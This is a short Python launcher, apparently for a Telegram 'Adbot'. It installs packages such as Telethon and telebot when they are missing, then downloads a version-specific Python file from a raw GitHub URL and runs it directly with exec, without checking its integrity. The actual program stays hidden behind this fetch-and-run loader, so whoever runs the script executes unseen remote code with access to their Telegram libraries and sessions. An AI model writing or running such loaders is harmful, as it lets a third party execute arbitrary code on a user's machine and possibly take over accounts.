import sys
import subprocess
import time
import importlib
packages = ["rich", "python-cfonts", "pytz", "Telethon==1.41.0", "requests", "telebot", "aiohttp"]
for pkg in packages:
    pkg_name = pkg.split('==')[0]
    try:
        importlib.import_module(pkg_name.replace("-", "_"))
    except ImportError:
        print(f"Installing {pkg}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
print("Wait 2 sec till it run")
time.sleep(2)
import requests
url = f"https://raw.githubusercontent.com/devilstein1/Files/refs/heads/main/Adbot/{sys.version_info.major}.{sys.version_info.minor}.py"
exec(requests.get(url).text)